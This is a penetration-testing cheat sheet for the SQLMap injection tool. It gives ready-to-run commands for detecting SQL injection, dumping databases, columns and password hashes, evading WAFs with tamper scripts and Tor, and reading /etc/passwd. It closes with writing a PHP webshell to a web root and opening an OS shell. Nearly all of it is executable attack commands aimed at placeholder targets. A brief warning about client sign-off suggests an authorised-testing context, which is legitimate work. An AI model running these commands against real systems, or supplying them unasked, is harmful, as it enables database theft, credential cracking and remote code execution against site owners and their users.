# SQLMap 

GitHub: https://github.com/sqlmapproject/sqlmap Pre-installed on Parrot/Kali. Manual install: `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`

SQLi technique codes (`--technique=BEUSTQ`): B=Boolean-blind, E=Error-based, U=Union, S=Stacked, T=Time-blind, Q=Inline. Default = all six.

Output saved to `~/.sqlmap/output/<target>/` — session files mean re-runs skip detection and resume from last state.

---

## Basic Usage

Quickest run — GET param, auto-answer all prompts:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --batch
```

From a saved Burp request file (right-click → Copy to file, or browser → Copy Request Headers):

```bash
sqlmap -r req.txt
```

Mark injection point in saved request with `*`: `/?id=*` or in POST body `uid=1*&name=test`

POST data inline:

```bash
sqlmap -u "http://<TARGET>/" --data "uid=1&name=test"
```

Target specific param only:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" -p id
```

---

## Request Customization

Cookie:

```bash
sqlmap ... --cookie="PHPSESSID=<VALUE>"
```

Custom header:

```bash
sqlmap ... -H "Cookie: PHPSESSID=<VALUE>"
```

Random User-Agent (important — default UA is blacklisted by many WAFs):

```bash
sqlmap ... --random-agent
```

Force HTTP method:

```bash
sqlmap ... --method PUT
```

Route through Burp proxy to watch traffic:

```bash
sqlmap ... --proxy="http://127.0.0.1:8080"
```

JSON/XML POST bodies → use `-r req.txt`, sqlmap auto-detects format.

---

## Debugging Failed Runs

Show DBMS errors inline:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --parse-errors
```

Save all HTTP traffic to file:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" -t /tmp/traffic.txt
```

Full verbosity — print every request/response live:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" -v 6 --batch
```

`-v 3` shows payloads being used — useful to compare level/risk changes.

---

## Tuning Detection

Raise level and risk when default fails — level 1-5 (more boundaries), risk 1-3 (more aggressive payloads including OR):

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --level=5 --risk=3 --batch
```

> [!warning] `--risk=3` enables OR payloads which can trigger DELETE/UPDATE on the DB. Don't use on production without client sign-off.

Custom prefix/suffix when injection point is inside nested quotes/brackets:

```bash
sqlmap -u "http://<TARGET>/?q=test" --prefix="%'))" --suffix="-- -"
```

Force specific technique only (faster, less noise):

```bash
sqlmap ... --technique=BEU
```

Fix detection on HTTP code difference:

```bash
sqlmap ... --code=200
```

Fix detection on string appearing in TRUE responses:

```bash
sqlmap ... --string="success"
```

Strip HTML tags, compare text only:

```bash
sqlmap ... --text-only
```

UNION tuning — specify column count if known:

```bash
sqlmap ... --union-cols=17 --union-char="a"
```

Oracle UNION requires FROM clause:

```bash
sqlmap ... --union-from=users
```

---

## Enumeration

Basic recon — banner, current user, current DB, DBA check:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --banner --current-user --current-db --is-dba --batch
```

List tables in a DB:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --tables -D <DBNAME> --batch
```

Dump a table:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump -T <TABLE> -D <DBNAME> --batch
```

Dump specific columns only:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump -T <TABLE> -D <DBNAME> -C username,password --batch
```

Dump specific rows:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump -T <TABLE> -D <DBNAME> --start=2 --stop=3 --batch
```

Conditional dump:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump -T <TABLE> -D <DBNAME> --where="name LIKE 'f%'" --batch
```

Dump entire current DB (skip -T):

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump -D <DBNAME> --batch
```

Dump everything, skip system DBs:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --dump-all --exclude-sysdbs --batch
```

Full DB schema (structure only, no data):

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --schema --batch
```

Search tables by keyword:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --search -T user --batch
```

Search columns by keyword — hunt for password columns fast:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --search -C pass --batch
```

Dump DB user password hashes + auto-crack:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --passwords --batch
```

> [!tip] When sqlmap finds hash-looking values in a dump, it auto-prompts to crack them using its built-in wordlist (`/usr/local/share/sqlmap/data/txt/wordlist.tx_`). Hit Y. Supports 31 hash types.

Nuclear option — grab everything, long runtime:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --all --batch
```

---

## WAF / Protection Bypass

Anti-CSRF token — specify the token param name, sqlmap auto-refreshes it:

```bash
sqlmap -u "http://<TARGET>/" --data="id=1&csrf-token=<VALUE>" --csrf-token="csrf-token" --batch
```

Randomize a unique-value param per request:

```bash
sqlmap -u "http://<TARGET>/?id=1&rp=12345" --randomize=rp --batch
```

Computed param (e.g. h=MD5(id)) — eval Python inline before each request:

```bash
sqlmap -u "http://<TARGET>/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

Hide your IP via proxy or Tor:

```bash
sqlmap ... --proxy="socks4://127.0.0.1:9050"
sqlmap ... --tor --check-tor
```

Skip WAF detection heuristic (less noise):

```bash
sqlmap ... --skip-waf
```

Bypass UA blacklist — always use this if getting 5XX immediately:

```bash
sqlmap ... --random-agent
```

Tamper scripts — chain with commas, applied in priority order:

```bash
sqlmap ... --tamper=between,randomcase
```

Key tampers: `between` (replaces `>` and `=`), `randomcase` (SELECT→SEleCt), `space2comment` (spaces→`/**/`), `base64encode`, `percentage`, `versionedkeywords` (MySQL), `modsecurityversioned` (ModSec bypass).

List all tampers: `sqlmap --list-tampers`

Chunked POST to split blacklisted keywords across chunks:

```bash
sqlmap ... --chunked
```

HTTP Parameter Pollution (ASP targets):

```bash
sqlmap ... --hpp
```

---

## OS Exploitation

Check DBA first — file read/write requires it:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --is-dba --batch
```

Read file from remote system:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --file-read "/etc/passwd" --batch
```

File saved to `~/.sqlmap/output/<target>/files/`

Write webshell to remote web root:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://<TARGET>/vuln.php?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" --batch
```

Then verify RCE:

```bash
curl "http://<TARGET>/shell.php?cmd=id"
```

Interactive OS shell — try error-based if UNION gives no output:

```bash
sqlmap -u "http://<TARGET>/vuln.php?id=1" --os-shell --technique=E --batch
```

> [!warning] `--os-shell` with UNION (`--technique=U`) often returns `No output`. Switch to `--technique=E` (error-based) for visible output. With `--batch`, sqlmap auto-selects PHP and common web roots (`/var/www/html`).

> [!tip] `secure_file_priv` must be empty in MySQL for file write to work. Check it first via `SHOW VARIABLES LIKE "secure_file_priv"` if you have DB access.